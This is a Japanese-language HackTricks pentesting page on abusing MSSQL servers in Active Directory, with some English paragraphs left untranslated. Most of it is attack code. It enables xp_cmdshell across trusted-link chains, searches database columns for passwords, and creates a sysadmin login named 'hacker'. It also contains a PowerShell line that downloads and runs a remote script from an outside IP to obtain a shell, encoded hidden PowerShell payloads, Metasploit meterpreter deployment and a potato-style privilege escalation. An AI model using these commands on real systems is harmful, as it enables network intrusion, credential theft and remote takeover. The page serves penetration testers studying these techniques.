# MSSQL ADの悪用

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

## **MSSQL列挙/検出**

この場合、PowerUpSQLというPowerShellモジュールが非常に便利です。
```powershell
Import-Module .\PowerupSQL.psd1
```
### ドメインセッションなしでネットワークから列挙する

If you have network access to an Active Directory (AD) environment but do not have a domain session, you can still perform enumeration to gather information about the AD infrastructure. This can be useful for reconnaissance purposes or when conducting a penetration test.

以下の手法を使用して、ドメインセッションなしでネットワークからActive Directory（AD）環境の情報を収集することができます。これは、偵察目的やペネトレーションテストを実施する際に役立ちます。

#### Enumerating SQL Server Instances

##### MSSQLPing

The `MSSQLPing` tool can be used to identify SQL Server instances on the network. It sends a UDP packet to port 1434 and listens for the response. This can help identify potential targets for further enumeration.

`MSSQLPing`ツールは、ネットワーク上のSQL Serverインスタンスを特定するために使用できます。ポート1434にUDPパケットを送信し、応答を待ちます。これにより、さらなる列挙の対象となるポテンシャルなターゲットを特定することができます。

##### SQL Server Browser Service

The SQL Server Browser service listens on UDP port 1434 and provides information about SQL Server instances running on the network. By querying this service, you can obtain details such as the instance name, version, and TCP port number.

SQL Server Browserサービスは、UDPポート1434で待ち受けており、ネットワーク上で実行されているSQL Serverインスタンスに関する情報を提供します。このサービスにクエリを送信することで、インスタンス名、バージョン、およびTCPポート番号などの詳細を取得できます。

##### SQL Server Information Gathering

Once you have identified SQL Server instances, you can use various techniques to gather information from them. This includes querying the `sys.databases` table to obtain a list of databases, querying the `sys.tables` table to obtain a list of tables, and querying the `sys.columns` table to obtain information about columns within a table.

SQL Serverインスタンスを特定したら、さまざまな手法を使用して情報を収集することができます。これには、`sys.databases`テーブルにクエリを送信してデータベースの一覧を取得したり、`sys.tables`テーブルにクエリを送信してテーブルの一覧を取得したり、`sys.columns`テーブルにクエリを送信してテーブル内の列に関する情報を取得したりすることが含まれます。

#### Enumerating LDAP

##### LDAP Enumeration Tools

There are several tools available for enumerating LDAP information from the network. These tools can be used to query the AD directory and gather information about users, groups, computers, and other objects.

ネットワークからLDAP情報を列挙するためには、いくつかのツールが利用できます。これらのツールを使用してADディレクトリにクエリを送信し、ユーザー、グループ、コンピューター、およびその他のオブジェクトに関する情報を収集することができます。

##### LDAP Enumeration Techniques

Some common LDAP enumeration techniques include querying the `rootDSE` object to obtain the default naming context, querying the `userAccountControl` attribute to identify disabled accounts, and querying the `memberOf` attribute to identify group memberships.

一般的なLDAP列挙の手法には、デフォルトの名前付けコンテキストを取得するために`rootDSE`オブジェクトにクエリを送信する方法、無効なアカウントを特定するために`userAccountControl`属性にクエリを送信する方法、およびグループのメンバーシップを特定するために`memberOf`属性にクエリを送信する方法があります。

##### LDAP Enumeration Scripts

There are also various scripts available that automate the LDAP enumeration process. These scripts can be useful for quickly gathering information about the AD environment.

LDAP列挙プロセスを自動化するさまざまなスクリプトも利用できます。これらのスクリプトは、AD環境に関する情報を迅速に収集するのに役立ちます。

#### Enumerating SMB

##### SMB Enumeration Tools

Several tools can be used to enumerate SMB information from the network. These tools can be used to query SMB shares, gather information about file systems, and identify potential vulnerabilities.

ネットワークからSMB情報を列挙するためには、いくつかのツールが利用できます。これらのツールを使用してSMB共有にクエリを送信し、ファイルシステムに関する情報を収集し、潜在的な脆弱性を特定することができます。

##### SMB Enumeration Techniques

Some common SMB enumeration techniques include querying the `net share` command to obtain a list of shared resources, querying the `net view` command to obtain a list of available servers, and querying the `smbclient` command to interact with SMB shares.

一般的なSMB列挙の手法には、共有リソースの一覧を取得するために`net share`コマンドにクエリを送信する方法、利用可能なサーバーの一覧を取得するために`net view`コマンドにクエリを送信する方法、およびSMB共有との対話のために`smbclient`コマンドにクエリを送信する方法があります。

##### SMB Enumeration Scripts

There are also scripts available that automate the SMB enumeration process. These scripts can be used to quickly gather information about SMB shares and identify potential vulnerabilities.

SMB列挙プロセスを自動化するスクリプトも利用できます。これらのスクリプトを使用して、SMB共有に関する情報を迅速に収集し、潜在的な脆弱性を特定することができます。
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### ドメイン内からの列挙

When conducting a penetration test or security assessment, it is important to gather as much information as possible about the target Active Directory (AD) environment. Enumerating from inside the domain allows for a deeper understanding of the AD infrastructure and potential vulnerabilities that can be exploited.

以下の手法を使用して、ドメイン内からの列挙を行います。

#### 1. Active Directory Enumeration

Active Directory enumeration involves gathering information about the AD domain, including users, groups, computers, and other objects. This can be done using various tools such as `net` commands, PowerShell scripts, or specialized enumeration tools like `BloodHound`.

#### 2. Service Principal Name (SPN) Enumeration

Service Principal Names (SPNs) are used to uniquely identify services running on computers in a domain. Enumerating SPNs can provide valuable information about the services available in the AD environment. Tools like `setspn` can be used to enumerate SPNs.

#### 3. SQL Server Enumeration

If SQL Server is running in the AD environment, enumerating SQL Server instances can provide additional attack vectors. Tools like `sqlcmd` or `mssql-cli` can be used to connect to SQL Server and gather information about databases, users, and other objects.

#### 4. LDAP Enumeration

LDAP (Lightweight Directory Access Protocol) enumeration involves querying the AD directory for information about users, groups, and other objects. Tools like `ldapsearch` or `ADExplorer` can be used to perform LDAP enumeration.

#### 5. SMB Enumeration

SMB (Server Message Block) enumeration involves gathering information about shared resources, such as file shares and printers, in the AD environment. Tools like `smbclient` or `enum4linux` can be used to enumerate SMB shares.

By enumerating from inside the domain, an attacker can gain valuable insights into the AD environment and identify potential vulnerabilities that can be exploited to further compromise the network.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQLの基本的な悪用

### データベースへのアクセス

MSSQLデータベースへのアクセスを得るために、以下の手法を使用することができます。

1. デフォルトのユーザー名とパスワードを使用する: MSSQLでは、デフォルトのユーザー名とパスワードが設定されている場合があります。これらの情報を使用してログインを試みることができます。

2. SQLインジェクションを利用する: アプリケーションがMSSQLデータベースに対してSQLクエリを実行する際に、不正な入力を注入することでデータベースにアクセスすることができます。

3. データベースの認証情報を盗む: サーバー上のファイルや設定からデータベースの認証情報を盗むことができます。これには、構成ファイルやログファイルの調査が含まれます。

4. データベースの脆弱性を悪用する: MSSQLデータベースには、脆弱性が存在する場合があります。これらの脆弱性を悪用してデータベースにアクセスすることができます。

5. データベースのバックアップファイルを利用する: バックアップファイルには、データベースへのアクセスに必要な情報が含まれている場合があります。これらのバックアップファイルを利用してデータベースにアクセスすることができます。

以上の手法を使用して、MSSQLデータベースへのアクセスを得ることができます。ただし、これらの手法は合法的な目的のためにのみ使用されるべきです。
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

MSSQLホスト内で**コマンドを実行**することも可能かもしれません。
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### MSSQL基本的なハッキングトリック

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL信頼されたリンク

もしMSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合、ユーザーが信頼されたデータベースに特権を持っている場合、彼は**他のインスタンスでもクエリを実行するための信頼関係を利用することができます**。この信頼関係はチェーン化されることがあり、ユーザーはいくつかの設定ミスのあるデータベースを見つけることができるかもしれません。

**データベース間のリンクはフォレストトラストを超えても機能します。**

### Powershellの悪用
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Metasploitを使用して、信頼できるリンクを簡単にチェックすることができます。
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
metasploitはMSSQLで`openquery()`関数のみを悪用しようとします（したがって、`openquery()`でコマンドを実行できない場合は、コマンドを実行するために`EXECUTE`メソッドを**手動で**試す必要があります。詳細は以下を参照してください。）

### 手動 - Openquery()

**Linux**からは、**sqsh**と**mssqlclient.py**を使用してMSSQLコンソールシェルを取得できます。

**Windows**からは、[**HeidiSQL**](https://www.heidisql.com)のような**MSSQLクライアント**を使用して、リンクを見つけてコマンドを手動で実行することもできます。

_Windows認証を使用してログイン:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### 信頼できるリンクの検索
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### 信頼できるリンクでクエリを実行する

リンクを介してクエリを実行します（例：新しいアクセス可能なインスタンスでさらにリンクを見つける）。
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
ダブルクォーテーションとシングルクォーテーションが使用されている場所を確認してください。その方法で使用することが重要です。
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

これらの信頼されたリンクチェーンは手動で永遠に続けることができます。
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
もし`openquery()`から`exec xp_cmdshell`のようなアクションを実行できない場合は、`EXECUTE`メソッドを使用してみてください。

### マニュアル - EXECUTE

`EXECUTE`を使用して、信頼されたリンクを悪用することもできます。
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## ローカル特権昇格

**MSSQLローカルユーザー**は通常、**`SeImpersonatePrivilege`**と呼ばれる特別な特権を持っています。これにより、アカウントは「認証後にクライアントをなりすます」ことができます。

多くの著者が考案した戦略は、システムサービスを強制して、攻撃者が作成した不正なサービスまたは中間者サービスに認証させることです。この不正なサービスは、システムサービスが認証しようとしている間に、システムサービスをなりすますことができます。

[SweetPotato](https://github.com/CCob/SweetPotato)には、これらのさまざまなテクニックが収集されており、Beaconの`execute-assembly`コマンドを介して実行することができます。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手**したいですか？または、**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
